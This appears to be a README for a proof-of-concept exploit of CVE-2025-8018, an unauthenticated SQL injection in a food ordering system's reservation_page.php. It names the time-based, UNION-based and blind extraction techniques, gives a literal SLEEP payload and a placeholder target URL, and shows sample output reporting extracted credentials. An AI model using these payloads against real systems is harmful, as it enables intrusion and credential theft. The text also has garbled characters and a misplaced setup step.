# CVE-2025-8018 Exploit ‚Äì Food Ordering Review System v1.0

This repository provides a Python proof-of-concept (PoC) exploit for **CVE‚Äë2025‚Äë8018**, a high-severity SQL Injection vulnerability discovered in the **Food Ordering Review System v1.0**. The vulnerability is triggered via the `reg_Id` parameter in `reservation_page.php`.

## üìå Vulnerability Overview

- **Affected File:** `/user/reservation_page.php`
- **Vulnerable Parameter:** `reg_Id`
- **Disclosure Date:** July 22, 2025
- **CVE Reference:** [CVE-2025-8018](https://nvd.nist.gov/vuln/detail/CVE-2025-8018)
- **Impact:** Allows attackers to execute arbitrary SQL queries, including data extraction from the `users` table, without authentication

## üí° Exploit Features

1. **Time-based blind SQL injection check** using `SLEEP()`
2. **Column-count discovery** using `UNION SELECT NULL,NULL,...`
3. **Data extraction** (e.g., usernames, passwords) via UNION-based injection
4. **Blind fallback extraction** to guess field lengths if direct output isn't visible

## üõ†Ô∏è Requirements

- Python 3.x
- `requests` library

Install dependencies:

TARGET_URL = "http://TARGET-IP/user/reservation_page.php"
Replace TARGET-IP with the actual address of the vulnerable system.

Run the exploit script:

```
python3 cve-2025-8018.py
```

Output
```
[*] Checking time-based SQLi with payload: 1 AND SLEEP(5)-- 
[+] Blind SQL injection confirmed!
[*] Testing how many columns the query expects...
[+] Looks like 3 columns work!
[*] Trying to extract data using UNION-based SQL injection...
[+] Found potential credentials in the response!
[*] Trying blind extraction fallback...
[+] Username is 7 characters long!
